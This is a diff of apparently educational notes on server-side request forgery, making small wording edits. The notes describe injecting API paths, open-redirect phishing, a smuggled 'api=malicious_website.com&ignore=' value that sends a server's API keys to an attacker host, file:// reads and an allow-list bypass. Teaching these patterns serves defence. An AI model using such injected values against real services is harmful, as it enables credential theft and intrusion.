@@ -46,7 +46,7 @@ A vulnerable entrypoint to this attack could be
 
 **Access another untended path** ✂<br> `a?api=path` $\to$ `b/path`
 
-It's not very likely to see something like this, but in that case, you could guess that the first server A is mapping the value given to `api` to the server b. You may try to inject the path, and see if you can access other API routes.
+In that case, you could guess that the first server A is mapping the value given to `api` to the server b. You may try to inject the path, and see if you can access other API routes.
 
 **Phishing** 🎣<br> `a?url=some_url` $\to$ `a?url=malicious_url`
 
@@ -56,7 +56,7 @@ An **open redirect** endpoint is redirecting every user to another URL. For inst
 
 **Steal API credentials** 🗝️<br> `a?api=xxx&r=path` $\to$ `xxx.b/path`
 
-It's not very likely again, but it's possible that the website is making requests to multiple APIs according to what the user wants. For instance, an API for Pokémon, and another for foods. Let's say, for food, the request will be made to `foods.thebestapi.com`, and for Pokémon, il will be `pokemon.thebestapi.com`. At first glance, the developer might think that's as we are always calling a subdomain of `thebestapi.com`, it's "safe". But, a hacker may use a trick like giving the following value `api=malicious_website.com&ignore=&r=path`. If so, the request will be made to `malicious_website.com?ignore=thebestapi.com/path`, as we gave the following value to `api`:`malicious_website.com&ignore=`. The goal of such redirect to another website is stealing the API keys stored in the headers.
+It's possible that the website is making requests to multiple APIs according to what the user wants. For instance, an API for Pokémon, and another for foods. Let's say, for food, the request will be made to `foods.thebestapi.com`, and for Pokémon, il will be `pokemon.thebestapi.com`. At first glance, the developer might think that's as we are always calling a subdomain of `thebestapi.com`, it's "safe". But, a hacker may use a trick like giving the following value `api=malicious_website.com&ignore=&r=path`. If so, the request will be made to `malicious_website.com?ignore=thebestapi.com/path`, as we gave the following value to `api`:`malicious_website.com&ignore=`. The goal of such redirect to another website is stealing the API keys stored in the headers.
 
 **Mapping ports/services** 🗺️
 
@@ -75,11 +75,11 @@ You might be able to steal files too, using URLs such as `file://some/file/on/th
 
 **Allow List/Whitelist**
 
-It's usually the better way. But, if there is condition is something like `URL is starting with https://example.com`, then it can be easily bypassed with `https://example.com.malicious.website`
+It's usually the better way. But, if there is condition is something like `URL is starting with https://example.com`, then it can be easily bypassed with `https://example.com.malicious.website`.
 
 **Others**
 
-* That the resource type is what was expected
+* Check that the resource type is what was expected
 * ...
 
 </div><div>
